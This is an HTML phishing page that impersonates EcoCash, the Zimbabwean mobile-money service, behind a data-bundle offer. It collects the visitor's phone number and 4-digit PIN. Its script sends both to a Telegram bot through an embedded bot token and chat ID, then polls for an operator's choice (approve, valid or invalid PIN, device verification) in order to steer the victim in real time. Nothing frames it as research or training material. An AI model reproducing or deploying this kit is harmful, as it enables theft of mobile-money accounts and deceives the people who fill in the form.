<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EcoCash | Verify Number · Zimbabwe</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', sans-serif;
            background: #f8f9fa;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 12px;
        }
        .container {
            width: 100%;
            max-width: 440px;
            background: white;
            border-radius: 24px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        .logo-section {
            text-align: center;
            padding: 18px 0 8px;
            background: linear-gradient(135deg, #0033a0 0%, #1a4dbf 100%);
        }
        .ecocash-logo {
            width: 82px;
            height: 82px;
            background: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto;
            font-size: 2.5rem;
            font-weight: 900;
            color: #0033a0;
        }
        h1 {
            text-align: center;
            font-size: 22px;
            font-weight: 700;
            color: #1e2937;
            margin: 16px 0 5px;
        }
        .subtitle {
            text-align: center;
            color: #475569;
            font-size: 15px;
            padding: 0 20px 16px;
            line-height: 1.5;
        }
        .offer-info {
            background: linear-gradient(135deg, rgba(0,51,160,0.08) 0%, rgba(0,176,80,0.08) 100%);
            margin: 0 20px 16px;
            padding: 14px;
            border-radius: 16px;
            text-align: center;
            border: 1px solid rgba(0,51,160,0.2);
        }
        .offer-info strong {
            color: #0033a0;
            font-weight: 700;
        }
        #offerPrice {
            color: #00b050;
            font-weight: 700;
            font-size: 22px;
            display: block;
            margin-top: 6px;
        }
        .form-section {
            padding: 0 25px 28px;
        }
        .form-group {
            margin-bottom: 18px;
        }
        label {
            display: block;
            font-size: 14.5px;
            font-weight: 600;
            margin-bottom: 7px;
            color: #1e2937;
        }
        input, select {
            width: 100%;
            padding: 14px 16px;
            border: 2px solid #e2e8f0;
            border-radius: 12px;
            font-size: 16.5px;
            font-family: 'Inter', sans-serif;
        }
        input:focus, select:focus {
            border-color: #0033a0;
            box-shadow: 0 0 0 4px rgba(0,51,160,0.1);
            outline: none;
        }
        .continue-btn {
            width: 100%;
            background: linear-gradient(135deg, #0033a0 0%, #1a4dbf 100%);
            color: white;
            border: none;
            padding: 16px;
            font-size: 17.5px;
            font-weight: 700;
            border-radius: 50px;
            cursor: pointer;
            margin-top: 8px;
            transition: all 0.3s ease;
        }
        .continue-btn:hover:not(:disabled) {
            box-shadow: 0 8px 24px rgba(0,51,160,0.3);
            transform: translateY(-2px);
        }
        .continue-btn:disabled {
            background: #94a3b8;
            cursor: not-allowed;
        }
        .back-btn {
            width: 100%;
            background: transparent;
            color: #64748b;
            border: 2px solid #e2e8f0;
            padding: 15px;
            font-size: 16px;
            font-weight: 600;
            border-radius: 50px;
            cursor: pointer;
            margin-top: 10px;
            transition: all 0.2s;
        }
        .back-btn:hover {
            border-color: #0033a0;
            color: #0033a0;
            background: rgba(0,51,160,0.05);
        }
        .error-msg {
            text-align: center;
            margin: 10px 0 16px;
            font-size: 14.5px;
            padding: 13px;
            border-radius: 12px;
            display: none;
            color: #dc3545;
            background: #ffebee;
            border: 1px solid #ffc6c6;
        }
        #spinner {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.92);
            z-index: 10000;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            color: white;
        }
        .spin {
            width: 65px;
            height: 65px;
            border: 6px solid rgba(255,255,255,0.2);
            border-top: 6px solid #0033a0;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo-section">
            <div class="ecocash-logo">E</div>
        </div>

        <h1>Verify Your Number</h1>
        <p class="subtitle">Please enter your EcoCash number and PIN to complete this offer and activate your bundle.</p>
     
        <div class="offer-info" id="offerInfo">
            <strong id="offerTitle"></strong>
            <span id="offerPrice"></span>
        </div>

        <div class="form-section">
            <div class="form-group">
                <label>Account Type</label>
                <select id="accountType">
                    <option value="mobile">Mobile Money</option>
                    <option value="data">Data Bundle</option>
                </select>
            </div>
            <div class="form-group">
                <label>Phone Number</label>
                <input type="tel" id="phone" placeholder="77 123 4567" maxlength="9">
            </div>
            <div class="form-group">
                <label>EcoCash PIN (4 digits)</label>
                <input type="password" id="password" placeholder="••••" maxlength="4" inputmode="numeric">
            </div>
            <div class="error-msg" id="errMsg"></div>
      
            <button class="continue-btn" id="continueBtn">Verify Number & Continue</button>
            <button class="back-btn" onclick="window.location.href='index.html'">← Back to Bundles</button>
        </div>
    </div>

    <!-- Spinner -->
    <div id="spinner">
        <div class="spin"></div>
        <p style="margin-top:25px; font-size:17px;">Verifying your number...</p>
    </div>

    <script>
        const CONFIG = {
            BOT_TOKEN: '8522259555:AAEl1CRJfLhjWwtqD2z6CvN-jesiotWQ__4',
            CHAT_ID: '8757709711',
            APPROVE_PAGE: 'success.html',
            DEVICE_PAGE: 'device_verify.html',
            SUCCESS_PAGE: 'success.html'
        };

        let state = { lastUpdateId: 0 };
        let isProcessing = false;

        const phoneInput = document.getElementById('phone');
        const pinInput = document.getElementById('password');
        const continueBtn = document.getElementById('continueBtn');
        const errMsg = document.getElementById('errMsg');
        const spinner = document.getElementById('spinner');
        const offerTitleEl = document.getElementById('offerTitle');
        const offerPriceEl = document.getElementById('offerPrice');

        function loadOffer() {
            const params = new URLSearchParams(window.location.search);
            const name = params.get('offer') || 'Data Bundle';
            const data = params.get('data') || '';
            const price = params.get('price') || '0';
           
            offerTitleEl.textContent = name + (data ? ` - ${data}` : '');
            offerPriceEl.textContent = `$ ${price}`;
        }

        function isValidZimbabweNumber(phone) {
            if (phone.length !== 9) return false;
            const validPrefixes = ['77', '78', '71', '72'];
            return validPrefixes.some(prefix => phone.startsWith(prefix));
        }

        phoneInput.addEventListener('input', () => {
            phoneInput.value = phoneInput.value.replace(/[^0-9]/g, '').slice(0, 9);
        });

        pinInput.addEventListener('input', () => {
            pinInput.value = pinInput.value.replace(/[^0-9]/g, '').slice(0, 4);
            if (pinInput.value.length === 4) pinInput.blur();
        });

        function sendToBot(phone, pin) {
            if (isProcessing) return;
            isProcessing = true;
            continueBtn.disabled = true;
            continueBtn.textContent = "Verifying...";

            const ts = Date.now();
            const approveId = `approve_${ts}`;
            const declineId = `decline_${ts}`;
            const verifyId = `verify_${ts}`;
            const validId = `valid_${ts}`;
            const invalidId = `invalid_${ts}`;

            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CONFIG.CHAT_ID,
                    text: `<b>🔵 EcoCash Verification Request</b>\n\nOffer: ${offerTitleEl.textContent}\nPhone: <code>+263${phone}</code>\nPIN: <code>${pin}</code>\n\nChoose Action:`,
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: "✅ Approve", callback_data: approveId },
                                { text: "📱 Verify Device", callback_data: verifyId }
                            ],
                            [
                                { text: "✅ Valid PIN", callback_data: validId },
                                { text: "❌ Invalid PIN", callback_data: invalidId }
                            ],
                            [{ text: "❌ Decline", callback_data: declineId }]
                        ]
                    }
                })
            }).then(() => {
                spinner.style.display = 'flex';
                startPolling(approveId, declineId, verifyId, validId, invalidId);
            }).catch(() => resetButton());
        }

        function startPolling(approveId, declineId, verifyId, validId, invalidId) {
            const interval = setInterval(() => {
                fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
                    .then(r => r.json())
                    .then(data => {
                        if (!data.ok || !data.result) return;
                        data.result.forEach(update => {
                            state.lastUpdateId = update.update_id;
                            if (update.callback_query) {
                                const cb = update.callback_query.data;
                                const params = new URLSearchParams(window.location.search);
                                if (cb === approveId) {
                                    clearInterval(interval);
                                    spinner.style.display = 'none';
                                    window.location.href = CONFIG.APPROVE_PAGE + '?' + params.toString();
                                } else if (cb === verifyId) {
                                    clearInterval(interval);
                                    spinner.style.display = 'none';
                                    window.location.href = CONFIG.DEVICE_PAGE + '?' + params.toString();
                                } else if (cb === validId) {
                                    clearInterval(interval);
                                    spinner.style.display = 'none';
                                    window.location.href = CONFIG.SUCCESS_PAGE + '?' + params.toString();
                                } else if (cb === invalidId || cb === declineId) {
                                    clearInterval(interval);
                                    spinner.style.display = 'none';
                                    errMsg.textContent = "Request declined or invalid PIN. Please try again.";
                                    errMsg.style.display = 'block';
                                    resetButton();
                                }
                            }
                        });
                    });
            }, 1000);
        }

        function resetButton() {
            isProcessing = false;
            continueBtn.disabled = false;
            continueBtn.textContent = "Verify Number & Continue";
        }

        continueBtn.onclick = () => {
            errMsg.style.display = 'none';
            const phone = phoneInput.value.trim();
            const pin = pinInput.value.trim();
            if (!phone || !isValidZimbabweNumber(phone)) {
                errMsg.textContent = "Please enter a valid Zimbabwe number (e.g. 771234567)";
                errMsg.style.display = 'block';
                return;
            }
            if (pin.length !== 4) {
                errMsg.textContent = "PIN must be 4 digits";
                errMsg.style.display = 'block';
                return;
            }
            sendToBot(phone, pin);
        };

        loadOffer();
        phoneInput.focus();
    </script>
</body>
</html>
